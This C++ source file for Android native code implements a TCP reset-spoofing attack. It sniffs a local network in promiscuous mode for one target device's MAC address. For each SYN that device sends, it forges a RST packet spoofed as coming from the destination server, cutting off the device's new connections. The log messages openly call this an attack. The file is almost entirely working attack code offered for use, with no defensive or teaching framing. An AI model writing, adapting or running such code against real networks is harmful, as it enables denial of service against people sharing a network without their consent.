#include "tcp_rst_spoof.h"
#include <android/log.h>
#include <cstring>
#include <thread>
#include <mutex>
#include <atomic>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/ether.h>
#include <netpacket/packet.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <errno.h>
#include <set>

#define LOG_TAG "TCPRST"
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

// Global state
static std::atomic<bool> g_rst_active(false);
static std::thread *g_rst_thread = nullptr;
static std::atomic<bool> g_rst_stop(false);
static int g_rst_raw_sock = -1;
static TCPRSTTarget g_current_rst_target;

// Track recently reset tuples to avoid flooding
static std::set<uint64_t> g_recent_resets;
static std::mutex g_rst_mutex;
// Cooldown is managed by set-size-based cache clearing (see cleanup_cooldowns)

static uint16_t tcp_rst_checksum(uint16_t *buf, int len) {
    uint32_t sum = 0;
    for (int i = 0; i < len / 2; i++) {
        sum += buf[i];
    }
    if (len % 2) {
        sum += ((uint8_t *)buf)[len - 1];
    }
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    return (uint16_t)~sum;
}

// Build a tuple key from src/dst IP and port
static uint64_t make_tuple_key(uint32_t src_ip, uint32_t dst_ip, uint16_t src_port, uint16_t dst_port) {
    return ((uint64_t)src_ip ^ (uint64_t)dst_ip) ^
           ((uint64_t)src_port << 16 | (uint64_t)dst_port);
}

// Send a forged TCP RST for a given SYN packet
static int send_tcp_rst(int raw_sock, const uint8_t *packet, int packet_len,
                         const uint8_t *target_mac, const char *iface) {
    // Parse Ethernet header
    struct ether_header *eth = (struct ether_header *)packet;
    if (ntohs(eth->ether_type) != ETHERTYPE_IP) return -1;

    // Parse IP header
    struct iphdr *ip = (struct iphdr *)(packet + sizeof(struct ether_header));
    int ip_hdr_len = ip->ihl * 4;
    if ((int)(sizeof(struct ether_header) + ip_hdr_len + sizeof(struct tcphdr)) > packet_len) return -1;

    // Must be TCP
    if (ip->protocol != IPPROTO_TCP) return -1;

    // Must be from our target client
    if (ip->saddr != (int32_t)inet_addr(g_current_rst_target.client_ip.c_str())) return -1;

    struct tcphdr *tcp = (struct tcphdr *)((uint8_t *)ip + ip_hdr_len);

    // Must be a SYN packet (and not RST already)
    if (!(tcp->syn) || tcp->rst) return -1;

    // Check cooldown to avoid flooding
    uint64_t tuple = make_tuple_key(ip->saddr, ip->daddr, ntohs(tcp->source), ntohs(tcp->dest));
    {
        std::lock_guard<std::mutex> lock(g_rst_mutex);
        if (g_recent_resets.find(tuple) != g_recent_resets.end()) {
            return 0; // Skip, already reset this tuple recently
        }
    }

    LOGD("SYN from %s:%d -> %s:%d — forging RST",
         inet_ntoa(*(struct in_addr *)&ip->saddr), ntohs(tcp->source),
         inet_ntoa(*(struct in_addr *)&ip->daddr), ntohs(tcp->dest));

    // Build RST packet
    uint8_t rst_buf[128]; // Smallest: ETH + IP + TCP = 14+20+20 = 54
    memset(rst_buf, 0, sizeof(rst_buf));

    // --- Ethernet header ---
    struct ether_header *rst_eth = (struct ether_header *)rst_buf;
    // Source MAC = destination MAC from original packet (the server's next-hop)
    // We spoof as the destination server at Layer 2 by using the router's MAC
    // Actually for RST, we should spoof as the destination server
    // Since we don't know the server's MAC, we use the gateway's MAC
    // iOS will accept RST as long as the source IP matches the destination
    memcpy(rst_eth->ether_dhost, target_mac, 6);
    // Get the router MAC from the original frame's source (which should be the gateway)
    memcpy(rst_eth->ether_shost, eth->ether_dhost, 6); // Use what the target sent to
    rst_eth->ether_type = htons(ETHERTYPE_IP);

    // --- IP header (spoofed as the destination server) ---
    struct iphdr *rst_ip = (struct iphdr *)(rst_buf + sizeof(struct ether_header));
    rst_ip->version = 4;
    rst_ip->ihl = 5;
    rst_ip->tos = 0;
    rst_ip->tot_len = 0; // fill later
    rst_ip->id = htons(0xDEAD);
    rst_ip->frag_off = 0;
    rst_ip->ttl = 64;
    rst_ip->protocol = IPPROTO_TCP;
    rst_ip->saddr = ip->daddr;  // Spoofed as the destination server
    rst_ip->daddr = ip->saddr;  // Sent back to client
    rst_ip->check = 0;

    // --- TCP header (RST) ---
    int rst_ip_hdr_len = sizeof(struct iphdr);
    struct tcphdr *rst_tcp = (struct tcphdr *)(rst_buf + sizeof(struct ether_header) + rst_ip_hdr_len);
    rst_tcp->source = tcp->dest;         // Server's port
    rst_tcp->dest = tcp->source;         // Client's port
    rst_tcp->seq = 0;                    // We don't know the server's seq, so use 0
    rst_tcp->ack_seq = htonl(ntohl(tcp->seq) + 1); // ACK the SYN
    rst_tcp->doff = 5;                   // 20 bytes header
    rst_tcp->rst = 1;                    // RST flag
    rst_tcp->ack = 1;                    // Also set ACK for better acceptance
    rst_tcp->window = htons(0);
    rst_tcp->check = 0;
    rst_tcp->urg_ptr = 0;

    int rst_tcp_len = sizeof(struct tcphdr);
    int rst_ip_total = rst_ip_hdr_len + rst_tcp_len;
    int rst_total = sizeof(struct ether_header) + rst_ip_total;

    rst_ip->tot_len = htons(rst_ip_total);
    rst_ip->check = tcp_rst_checksum((uint16_t *)rst_ip, rst_ip_hdr_len);

    // TCP checksum with pseudo-header
    struct {
        uint32_t src;
        uint32_t dst;
        uint8_t zero;
        uint8_t proto;
        uint16_t len;
    } __attribute__((packed)) psh;

    psh.src = rst_ip->saddr;
    psh.dst = rst_ip->daddr;
    psh.zero = 0;
    psh.proto = IPPROTO_TCP;
    psh.len = htons(rst_tcp_len);

    uint8_t checksum_buf[sizeof(psh) + sizeof(struct tcphdr)];
    memcpy(checksum_buf, &psh, sizeof(psh));
    memcpy(checksum_buf + sizeof(psh), rst_tcp, rst_tcp_len);
    rst_tcp->check = tcp_rst_checksum((uint16_t *)checksum_buf, sizeof(checksum_buf));

    // Send the RST
    struct sockaddr_ll dest;
    memset(&dest, 0, sizeof(dest));
    dest.sll_family = AF_PACKET;
    dest.sll_ifindex = if_nametoindex(iface);
    dest.sll_halen = 6;
    memcpy(dest.sll_addr, target_mac, 6);
    dest.sll_protocol = htons(ETHERTYPE_IP);

    ssize_t sent = sendto(raw_sock, rst_buf, rst_total, 0,
                          (struct sockaddr *)&dest, sizeof(dest));
    if (sent > 0) {
        // Add to cooldown set
        {
            std::lock_guard<std::mutex> lock(g_rst_mutex);
            g_recent_resets.insert(tuple);
        }
        LOGD("  -> Sent RST: %s:%d <- %s:%d",
             inet_ntoa(*(struct in_addr *)&rst_ip->daddr), ntohs(rst_tcp->dest),
             inet_ntoa(*(struct in_addr *)&rst_ip->saddr), ntohs(rst_tcp->source));
        return (int)sent;
    }
    LOGE("  -> Failed RST: %s", strerror(errno));
    return -1;
}

// Periodic cooldown cleanup
static void cleanup_cooldowns() {
    std::lock_guard<std::mutex> lock(g_rst_mutex);
    // Since we don't have timestamps per entry, just clear periodically
    if (g_recent_resets.size() > 1000) {
        g_recent_resets.clear();
        LOGD("Cleared RST cooldown cache (%zu entries)", g_recent_resets.size());
    }
}

// Main TCP RST thread
static void tcp_rst_thread_func() {
    LOGD("TCP RST thread starting on %s targeting %s",
         g_current_rst_target.interface_name.c_str(),
         g_current_rst_target.client_ip.c_str());

    // Create raw socket
    g_rst_raw_sock = socket(AF_PACKET, SOCK_RAW, htons(ETHERTYPE_IP));
    if (g_rst_raw_sock < 0) {
        LOGE("Failed to create raw socket: %s", strerror(errno));
        return;
    }

    // Bind to interface
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, g_current_rst_target.interface_name.c_str(), IFNAMSIZ - 1);
    if (setsockopt(g_rst_raw_sock, SOL_SOCKET, SO_BINDTODEVICE, &ifr, sizeof(ifr)) < 0) {
        LOGE("Failed to bind to interface %s: %s",
             g_current_rst_target.interface_name.c_str(), strerror(errno));
        close(g_rst_raw_sock);
        g_rst_raw_sock = -1;
        return;
    }

    // Set promiscuous mode
    struct packet_mreq mr;
    memset(&mr, 0, sizeof(mr));
    mr.mr_ifindex = if_nametoindex(g_current_rst_target.interface_name.c_str());
    mr.mr_type = PACKET_MR_PROMISC;
    setsockopt(g_rst_raw_sock, SOL_PACKET, PACKET_ADD_MEMBERSHIP, &mr, sizeof(mr));

    // Set receive timeout
    struct timeval tv;
    tv.tv_sec = 1;
    tv.tv_usec = 0;
    setsockopt(g_rst_raw_sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    uint8_t target_mac[6];
    if (sscanf(g_current_rst_target.client_mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &target_mac[0], &target_mac[1], &target_mac[2],
               &target_mac[3], &target_mac[4], &target_mac[5]) != 6) {
        LOGE("Failed to parse target MAC");
        close(g_rst_raw_sock);
        g_rst_raw_sock = -1;
        return;
    }

    LOGD("TCP RST sniffer active...");
    uint8_t buf[2048];
    int rst_count = 0;
    int cleanup_counter = 0;

    while (!g_rst_stop) {
        struct sockaddr_ll addr;
        socklen_t addr_len = sizeof(addr);
        int n = recvfrom(g_rst_raw_sock, buf, sizeof(buf), 0,
                         (struct sockaddr *)&addr, &addr_len);
        if (n < 0) {
            if (errno == EINTR || errno == EAGAIN || errno == EWOULDBLOCK) {
                // Periodic cleanup
                cleanup_counter++;
                if (cleanup_counter % 10 == 0) {
                    cleanup_cooldowns();
                }
                continue;
            }
            LOGE("Sniff error: %s", strerror(errno));
            break;
        }

        // Only process packets from/to our target MAC
        struct ether_header *eth = (struct ether_header *)buf;
        if (memcmp(eth->ether_shost, target_mac, 6) != 0 &&
            memcmp(eth->ether_dhost, target_mac, 6) != 0) {
            continue; // Not for/from our target
        }

        int result = send_tcp_rst(g_rst_raw_sock, buf, n, target_mac,
                                   g_current_rst_target.interface_name.c_str());
        if (result > 0) {
            rst_count++;
        }

        cleanup_counter++;
        if (cleanup_counter % 50 == 0) {
            cleanup_cooldowns();
        }
    }

    close(g_rst_raw_sock);
    g_rst_raw_sock = -1;
    LOGD("TCP RST thread stopped. Total RSTs sent: %d", rst_count);

    // Clear cooldown cache
    {
        std::lock_guard<std::mutex> lock(g_rst_mutex);
        g_recent_resets.clear();
    }
}

bool tcp_rst_init() {
    LOGD("Initializing TCP RST operations");
    return true;
}

bool tcp_rst_start(const TCPRSTTarget &target) {
    LOGD("Starting TCP RST attack against %s (%s) on %s",
         target.client_ip.c_str(), target.client_mac.c_str(),
         target.interface_name.c_str());

    if (g_rst_active.load()) {
        LOGE("TCP RST already active");
        return false;
    }

    g_current_rst_target = target;
    g_rst_stop = false;

    try {
        g_rst_thread = new std::thread(tcp_rst_thread_func);
        g_rst_active = true;
        LOGD("✓ TCP RST attack started");
        return true;
    } catch (const std::exception &e) {
        LOGE("Failed to start thread: %s", e.what());
        return false;
    }
}

void tcp_rst_stop() {
    LOGD("Stopping TCP RST");
    if (!g_rst_active.load()) return;

    g_rst_stop = true;
    if (g_rst_raw_sock >= 0) {
        close(g_rst_raw_sock);
        g_rst_raw_sock = -1;
    }
    if (g_rst_thread && g_rst_thread->joinable()) {
        g_rst_thread->join();
        delete g_rst_thread;
        g_rst_thread = nullptr;
    }
    g_rst_active = false;
    LOGD("✓ TCP RST stopped");
}

bool tcp_rst_is_active() {
    return g_rst_active.load();
}

void tcp_rst_cleanup() {
    LOGD("Cleaning up TCP RST");
    tcp_rst_stop();
}
